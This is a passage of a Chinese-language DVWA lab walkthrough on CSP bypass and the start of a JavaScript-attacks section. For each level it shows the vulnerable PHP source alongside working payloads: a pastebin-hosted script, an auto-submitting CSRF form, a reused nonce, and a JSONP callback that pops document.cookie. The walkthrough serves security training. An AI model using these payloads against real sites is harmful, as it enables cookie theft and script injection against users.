class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:name&#x27;</span>, <span class="variable">$name</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>message</code> 和 <code>name</code> 变量都进行了严格的过滤，且还检测了用户的 token,有效的防止了 CSRF 的攻击。</p>
<h1 id="CSP-Bypass-Content-Security-Policy-Bypass-内容安全策略绕过"><a href="#CSP-Bypass-Content-Security-Policy-Bypass-内容安全策略绕过" class="headerlink" title="CSP Bypass (Content Security Policy Bypass,内容安全策略绕过)"></a>CSP Bypass (Content Security Policy Bypass,内容安全策略绕过)</h1><p>CSP 是一种白名单制度，实现和执行全部由浏览器完成，开发者只需提供配置。CSP 大大增强了网页的安全性，攻击者发现漏洞，也没法注入脚本，除非控制了一台例如了白名单的可信主机。</p>
<h2 id="Low-13"><a href="#Low-13" class="headerlink" title="Low"></a>Low</h2><h3 id="源码-44"><a href="#源码-44" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$headerCSP</span> = <span class="string">&quot;Content-Security-Policy: script-src &#x27;self&#x27; https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;&quot;</span>; <span class="comment">// allows js from self, pastebin.com, jquery and google analytics.</span></span><br><span class="line"></span><br><span class="line">header(<span class="variable">$headerCSP</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://pastebin.com/raw/R570EE00</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$page</span>[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">    &lt;script src=&#x27;&quot;</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>] . <span class="string">&quot;&#x27;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$page</span>[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>白名单:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">self</span><br><span class="line">https:&#x2F;&#x2F;pastebin.com</span><br><span class="line">example.com</span><br><span class="line">code.jquer.com</span><br><span class="line">https:&#x2F;&#x2F;ssl.google-analytics.com</span><br></pre></td></tr></table></figure>
<p><code>pastebin.com</code> 是一个快速分享文本内容的网站，内容可控，可以在里面插入 XSS 攻击语句 <code>alert(document.cookie)</code> 。</p>
<h3 id="漏洞利用-36"><a href="#漏洞利用-36" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>在 <code>http://pastebin.com&#39;</code> 中创建内容为 <code>alert(&#39;XSS&#39;);</code> 的分享，生成 <code>https://pastebin.com/FY6tnzuS</code> ，通过 <code>https://pastebin.com/raw/FY6tnzuS</code> 可访问内容。</p>
<p>在文本框中输入 <code>https://pastebin.com/raw/FY6tnzuS</code> 点击 <code>include</code> 即可将文件包含进去，从而触发 XSS。通过查看浏览器源代码可发现被嵌入了 XSS : <code>&lt;script src=&#39;https://pastebin.com/raw/FY6tnzuS&#39;&gt;&lt;/script&gt;</code></p>
<p>可配合 CSRF 使攻击自动化,创建 <code>csrf.html</code> 放到网站服务器上，设法让受害者访问就会触发。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://dvwa.local/vulnerabilities/csp/&quot;</span> <span class="attr">id</span>=<span class="string">&quot;csp&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;include&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> form = <span class="built_in">document</span>.getElementById(<span class="string">&quot;csp&quot;</span>);</span></span><br><span class="line"><span class="javascript">  form[<span class="number">0</span>].value=<span class="string">&quot;https://pastebin.com/raw/FY6tnzuS&quot;</span>;</span></span><br><span class="line">  form.submit();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="Medium-12"><a href="#Medium-12" class="headerlink" title="Medium"></a>Medium</h2><h3 id="源码-45"><a href="#源码-45" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$headerCSP</span> = <span class="string">&quot;Content-Security-Policy: script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line">header(<span class="variable">$headerCSP</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Disable XSS protections so that inline alert boxes will work</span></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$page</span>[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">    &quot;</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>] . <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$page</span>[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>script-src</code> 的合法来源发生了变化:</p>
<ul>
<li><code>unsafe-inline</code>: 允许执行页面内嵌的 <code>&lt;script&gt;</code> 标签和事件监听函数</li>
<li><code>unsafe-eval</code>: 允许将字符串当作代码执行,如 <code>eval</code> 、<code>setTimeout</code>、<code>setInterval</code> 和 <code>Function</code>等函数</li>
<li><code>nonce</code>: 每次 HTTP 回应给出一个授权 <code>token</code>，页面内嵌脚本必须有这个 <code>token</code> ，才会执行</li>
<li><code>hash</code>: 列出允许执行的脚本代码的 Hash 值，页面内嵌脚本的哈希值只有吻合才执行。</li>
</ul>
</blockquote>
<p>使用了 <code>unsafe-inline</code> 和 <code>nonce</code> 所以页面内嵌脚本必须要有 <code>token</code> 才能被执行</p>
<h3 id="漏洞利用-37"><a href="#漏洞利用-37" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>直接输入:</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="High-12"><a href="#High-12" class="headerlink" title="High"></a>High</h2><h3 id="源码-46"><a href="#源码-46" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$headerCSP</span> = <span class="string">&quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line">header(<span class="variable">$headerCSP</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$page</span>[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">    &quot;</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>] . <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$page</span>[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;The page makes a call to &#x27;</span> . DVWA_WEB_PAGE_TO_ROOT . <span class="string">&#x27;/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;script src=&quot;source/high.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><figcaption><span>source/high.js</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clickButton</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="built_in">document</span>.createElement(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">    s.src = <span class="string">&quot;source/jsonp.php?callback=solveSum&quot;</span>;</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">solveSum</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;answer&quot;</span> <span class="keyword">in</span> obj) &#123;</span><br><span class="line">        <span class="built_in">document</span>.getElementById(<span class="string">&quot;answer&quot;</span>).innerHTML = obj[<span class="string">&#x27;answer&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> solve_button = <span class="built_in">document</span>.getElementById (<span class="string">&quot;solve&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (solve_button) &#123;</span><br><span class="line">    solve_button.addEventListener(<span class="string">&quot;click&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        clickButton();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>CSP 规则十分苛刻，只能引用允许 <code>self</code> 的脚本执行， <code>self</code> 是指本页面加载的脚本，也就是 <code>source/high.js</code> 这个脚本。</p>
<p>页面提示调用 <code>../. // vulnerability /csp/source/jsonp.php</code> 来加载一些代码。<br>审查元素关键代码在<code>&lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;</code> &gt;&gt; <code>id=&quot;solve&quot;</code> 对应的代码在 JS 中 &gt;&gt; 触发 JS 中的 <code>clickButton</code> 函数，该函数会创建一个 <code>script</code> 标签 <code>&lt;script src=&quot;http://dvwa.local/vulnerabilities/csp/source/jsonp.php?callback=solveSum&quot;&gt;&lt;/script&gt;</code> &gt;&gt; 访问 <code>http://dvwa/vulnerabilities/csp/source/jsonp.php?callback=solveSum</code> 得到 <code>solveSum(&#123;&quot;answer&quot;:&quot;15&quot;&#125;)</code> &gt;&gt; 最后会调用 JS 的 <code>solveSum</code> 函数将结果输出到网页中。 &gt;&gt; 暴露的<code>callback</code> 参数未做过滤，完全可做操作，可直接构造 <code>jsonp.php?callback=alert(document.cookie)</code> 若此构造被执行就能触发弹框。</p>
</blockquote>
<h3 id="漏洞利用-38"><a href="#漏洞利用-38" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>由于 POST 提交的 <code>include</code> 参数直接放到了 body 源码中，可直接改 <code>indlude</code> 进行弹框,使用 hackbar 修改 Post data 即可弹出。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">include=&lt;script src=source/jsonp.php?callback=alert(document.cookie)&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="Impossible-12"><a href="#Impossible-12" class="headerlink" title="Impossible"></a>Impossible</h2><h3 id="源码-47"><a href="#源码-47" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$headerCSP</span> = <span class="string">&quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line">header(<span class="variable">$headerCSP</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$page</span>[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">    &quot;</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>] . <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$page</span>[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;Unlike the high level, this does a JSONP call but does not use a callback, instead it hardcodes the function to call.&lt;/p&gt;&lt;p&gt;The CSP settings only allow external JavaScript on the local server and no inline code.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;script src=&quot;source/impossible.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><figcaption><span>source/impossible.js</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clickButton</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="built_in">document</span>.createElement(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">    s.src = <span class="string">&quot;source/jsonp_impossible.php&quot;</span>;</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">solveSum</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;answer&quot;</span> <span class="keyword">in</span> obj) &#123;</span><br><span class="line">        <span class="built_in">document</span>.getElementById(<span class="string">&quot;answer&quot;</span>).innerHTML = obj[<span class="string">&#x27;answer&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> solve_button = <span class="built_in">document</span>.getElementById (<span class="string">&quot;solve&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (solve_button) &#123;</span><br><span class="line">    solve_button.addEventListener(<span class="string">&quot;click&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        clickButton();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>指定只能输出 <code>solveSum</code> 意味着只能回调 JS 里的 <code>solveSum</code> 函数</p>
<h1 id="JavaScript-JavaScript-Attacks-JS-攻击"><a href="#JavaScript-JavaScript-Attacks-JS-攻击" class="headerlink" title="JavaScript (JavaScript Attacks,JS 攻击)"></a>JavaScript (JavaScript Attacks,JS 攻击)</h1><h2 id="Low-14"><a href="#Low-14" class="headerlink" title="Low"></a>Low</h2><h3 id="源码-48"><a href="#源码-48" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$page</span>[ <span class="string">&#x27;body&#x27;</span> ] .= &lt;&lt;&lt;EOF</span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">MD5 code from here</span></span><br><span class="line"><span class="comment">https://github.com/blueimp/JavaScript-MD5</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">!<span class="function"><span class="keyword">function</span>(<span class="params">n</span>)</span>&#123;<span class="string">&quot;use strict&quot;</span>;<span class="function"><span class="keyword">function</span> <span class="title">t</span>(<span class="params">n,t</span>)</span>&#123;<span class="keyword">var</span> r=(<span class="number">65535</span>&amp;n)+(<span class="number">65535</span>&amp;t);<span class="keyword">return</span>(n&gt;&gt;<span class="number">16</span>)+(t&gt;&gt;<span class="number">16</span>)+(r&gt;&gt;<span class="number">16</span>)&lt;&lt;<span class="number">16</span>|<span class="number">65535</span>&amp;r&#125;<span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params">n,t</span>)</span>&#123;<span class="keyword">return</span> n&lt;&lt;t|n&gt;&gt;&gt;<span class="number">32</span>-t&#125;<span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params">n,e,o,u,c,f</span>)</span>&#123;<span class="keyword">return</span> t(r(t(t(e,n),t(u,f)),c),o)&#125;<span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params">n,t,r,o,u,c,f</span>)</span>&#123;<span class="keyword">return</span> e(t&amp;r|~t&amp;o,n,t,u,c,f)&#125;<span class="function"><span class="keyword">function</span> <span class="title">u</span>(<span class="params">n,t,r,o,u,c,f</span>)</span>&#123;<span class="keyword">return</span> e(t&amp;o|r&amp;~o,n,t,u,c,f)&#125;<span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params">n,t,r,o,u,c,f</span>)</span>&#123;<span class="keyword">return</span> e(t^r^o,n,t,u,c,f)&#125;<span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">n,t,r,o,u,c,f</span>)</span>&#123;<span class="keyword">return</span> e(r^(t|~o),n,t,u,c,f)&#125;<span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params">n,r</span>)</span>&#123;n[r&gt;&gt;<span class="number">5</span>]|=<span class="number">128</span>&lt;&lt;r%<span class="number">32</span>,n[<span class="number">14</span>+(r+<span class="number">64</span>&gt;&gt;&gt;<span class="number">9</span>&lt;&lt;<span class="number">4</span>)]=r;<span class="keyword">var</span> e,i,a,d,h,l=<span class="number">1732584193</span>,g=<span class="number">-271733879</span>,v=<span class="number">-1732584194</span>,m=<span class="number">271733878</span>;<span class="keyword">for</span>(e=<span class="number">0</span>;e&lt;n.length;e+=<span class="number">16</span>)i=l,a=g,d=v,h=m,g=f(g=f(g=f(g=f(g=c(g=c(g=c(g=c(g=u(g=u(g=u(g=u(g=o(g=o(g=o(g=o(g,v=o(v,m=o(m,l=o(l,g,v,m,n[e],<span class="number">7</span>,<span class="number">-680876936</span>),g,v,n[e+<span class="number">1</span>],<span class="number">12</span>,<span class="number">-389564586</span>),l,g,n[e+<span class="number">2</span>],<span class="number">17</span>,<span class="number">606105819</span>),m,l,n[e+<span class="number">3</span>],<span class="number">22</span>,<span class="number">-1044525330</span>),v=o(v,m=o(m,l=o(l,g,v,m,n[e+<span class="number">4</span>],<span class="number">7</span>,<span class="number">-176418897</span>),g,v,n[e+<span class="number">5</span>],<span class="number">12</span>,<span class="number">1200080426</span>),l,g,n[e+<span class="number">6</span>],<span class="number">17</span>,<span class="number">-1473231341</span>),m,l,n[e+<span class="number">7</span>],<span class="number">22</span>,<span class="number">-45705983</span>),v=o(v,m=o(m,l=o(l,g,v,m,n[e+<span class="number">8</span>],<span class="number">7</span>,<span class="number">1770035416</span>),g,v,n[e+<span class="number">9</span>],<span class="number">12</span>,<span class="number">-1958414417</span>),l,g,n[e+<span class="number">10</span>],<span class="number">17</span>,<span class="number">-42063</span>),m,l,n[e+<span class="number">11</span>],<span class="number">22</span>,<span class="number">-1990404162</span>),v=o(v,m=o(m,l=o(l,g,v,m,n[e+<span class="number">12</span>],<span class="number">7</span>,<span class="number">1804603682</span>),g,v,n[e+<span class="number">13</span>],<span class="number">12</span>,<span class="number">-40341101</span>),l,g,n[e+<span class="number">14</span>],<span class="number">17</span>,<span class="number">-1502002290</span>),m,l,n[e+<span class="number">15</span>],<span class="number">22</span>,<span class="number">1236535329</span>),v=u(v,m=u(m,l=u(l,g,v,m,n[e+<span class="number">1</span>],<span class="number">5</span>,<span class="number">-165796510</span>),g,v,n[e+<span class="number">6</span>],<span class="number">9</span>,<span class="number">-1069501632</span>),l,g,n[e+<span class="number">11</span>],<span class="number">14</span>,<span class="number">643717713</span>),m,l,n[e],<span class="number">20</span>,<span class="number">-373897302</span>),v=u(v,m=u(m,l=u(l,g,v,m,n[e+<span class="number">5</span>],<span class="number">5</span>,<span class="number">-701558691</span>),g,v,n[e+<span class="number">10</span>],<span class="number">9</span>,<span class="number">38016083</span>),l,g,n[e+<span class="number">15</span>],<span class="number">14</span>,<span class="number">-660478335</span>),m,l,n[e+<span class="number">4</span>],<span class="number">20</span>,<span class="number">-405537848</span>),v=u(v,m=u(m,l=u(l,g,v,m,n[e+<span class="number">9</span>],<span class="number">5</span>,<span class="number">568446438</span>),g,v,n[e+<span class="number">14</span>],<span class="number">9</span>,<span class="number">-1019803690</span>),l,g,n[e+<span class="number">3</span>],<span class="number">14</span>,<span class="number">-187363961</span>),m,l,n[e+<span class="number">8</span>],<span class="number">20</span>,<span class="number">1163531501</span>),v=u(v,m=u(m,l=u(l,g,v,m,n[e+<span class="number">13</span>],<span class="number">5</span>,<span class="number">-1444681467</span>),g,v,n[e+<span class="number">2</span>],<span class="number">9</span>,<span class="number">-51403784</span>),l,g,n[e+<span class="number">7</span>],<span class="number">14</span>,<span class="number">1735328473</span>),m,l,n[e+<span class="number">12</span>],<span class="number">20</span>,<span class="number">-1926607734</span>),v=c(v,m=c(m,l=c(l,g,v,m,n[e+<span class="number">5</span>],<span class="number">4</span>,<span class="number">-378558</span>),g,v,n[e+<span class="number">8</span>],<span class="number">11</span>,<span class="number">-2022574463</span>),l,g,n[e+<span class="number">11</span>],<span class="number">16</span>,<span class="number">1839030562</span>),m,l,n[e+<span class="number">14</span>],<span class="number">23</span>,<span class="number">-35309556</span>),v=c(v,m=c(m,l=c(l,g,v,m,n[e+<span class="number">1</span>],<span class="number">4</span>,<span class="number">-1530992060</span>),g,v,n[e+<span class="number">4</span>],<span class="number">11</span>,<span class="number">1272893353</span>),l,g,n[e+<span class="number">7</span>],<span class="number">16</span>,<span class="number">-155497632</span>),m,l,n[e+<span class="number">10</span>],<span class="number">23</span>,<span class="number">-1094730640</span>),v=c(v,m=c(m,l=c(l,g,v,m,n[e+<span class="number">13</span>],<span class="number">4</span>,<span class="number">681279174</span>),g,v,n[e],<span class="number">11</span>,<span class="number">-358537222</span>),l,g,n[e+<span class="number">3</span>],<span class="number">16</span>,<span class="number">-722521979</span>),m,l,n[e+<span class="number">6</span>],<span class="number">23</span>,<span class="number">76029189</span>),v=c(v,m=c(m,l=c(l,g,v,m,n[e+<span class="number">9</span>],<span class="number">4</span>,<span class="number">-640364487</span>),g,v,n[e+<span class="number">12</span>],<span class="number">11</span>,<span class="number">-421815835</span>),l,g,n[e+<span class="number">15</span>],<span class="number">16</span>,<span class="number">530742520</span>),m,l,n[e+<span class="number">2</span>],<span class="number">23</span>,<span class="number">-995338651</span>),v=f(v,m=f(m,l=f(l,g,v,m,n[e],<span class="number">6</span>,<span class="number">-198630844</span>),g,v,n[e+<span class="number">7</span>],<span class="number">10</span>,<span class="number">1126891415</span>),l,g,n[e+<span class="number">14</span>],<span class="number">15</span>,<span class="number">-1416354905</span>),m,l,n[e+<span class="number">5</span>],<span class="number">21</span>,<span class="number">-57434055</span>),v=f(v,m=f(m,l=f(l,g,v,m,n[e+<span class="number">12</span>],<span class="number">6</span>,<span class="number">1700485571</span>),g,v,n[e+<span class="number">3</span>],<span class="number">10</span>,<span class="number">-1894986606</span>),l,g,n[e+<span class="number">10</span>],<span class="number">15</span>,<span class="number">-1051523</span>),m,l,n[e+<span class="number">1</span>],<span class="number">21</span>,<span class="number">-2054922799</span>),v=f(v,m=f(m,l=f(l,g,v,m,n[e+<span class="number">8</span>],<span class="number">6</span>,<span class="number">1873313359</span>),g,v,n[e+<span class="number">15</span>],<span class="number">10</span>,<span class="number">-30611744</span>),l,g,n[e+<span class="number">6</span>],<span class="number">15</span>,<span class="number">-1560198380</span>),m,l,n[e+<span class="number">13</span>],<span class="number">21</span>,<span class="number">1309151649</span>),v=f(v,m=f(m,l=f(l,g,v,m,n[e+<span class="number">4</span>],<span class="number">6</span>,<span class="number">-145523070</span>),g,v,n[e+<span class="number">11</span>],<span class="number">10</span>,<span class="number">-1120210379</span>),l,g,n[e+<span class="number">2</span>],<span class="number">15</span>,<span class="number">718787259</span>),m,l,n[e+<span class="number">9</span>],<span class="number">21</span>,<span class="number">-343485551</span>),l=t(l,i),g=t(g,a),v=t(v,d),m=t(m,h);<span class="keyword">return</span>[l,g,v,m]&#125;<span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params">n</span>)</span>&#123;<span class="keyword">var</span> t,r=<span class="string">&quot;&quot;</span>,e=<span class="number">32</span>*n.length;<span class="keyword">for</span>(t=<span class="number">0</span>;t&lt;e;t+=<span class="number">8</span>)r+=<span class="keyword">String</span>.fromCharCode(n[t&gt;&gt;<span class="number">5</span>]&gt;&gt;&gt;t%<span class="number">32</span>&amp;<span class="number">255</span>);<span class="keyword">return</span> r&#125;<span class="function"><span class="keyword">function</span> <span class="title">d</span>(<span class="params">n</span>)</span>&#123;<span class="keyword">var</span> t,r=[];<span class="keyword">for</span>(r[(n.length&gt;&gt;<span class="number">2</span>)<span class="number">-1</span>]=<span class="keyword">void</span> <span class="number">0</span>,t=<span class="number">0</span>;t&lt;r.length;t+=<span class="number">1</span>)r[t]=<span class="number">0</span>;<span class="keyword">var</span> e=<span class="number">8</span>*n.length;<span class="keyword">for</span>(t=<span class="number">0</span>;t&lt;e;t+=<span class="number">8</span>)r[t&gt;&gt;<span class="number">5</span>]|=(<span class="number">255</span>&amp;n.charCodeAt(t/<span class="number">8</span>))&lt;&lt;t%<span class="number">32</span>;<span class="keyword">return</span> r&#125;<span class="function"><span class="keyword">function</span> <span class="title">h</span>(<span class="params">n</span>)</span>&#123;<span class="keyword">return</span> a(i(d(n),<span class="number">8</span>*n.length))&#125;<span class="function"><span class="keyword">function</span> <span class="title">l</span>(<span class="params">n,t</span>)</span>&#123;<span class="keyword">var</span> r,e,o=d(n),u=[],c=[];<span class="keyword">for</span>(u[<span class="number">15</span>]=c[<span class="number">15</span>]=<span class="keyword">void</span> <span class="number">0</span>,o.length&gt;<span class="number">16</span>&amp;&amp;(o=i(o,<span 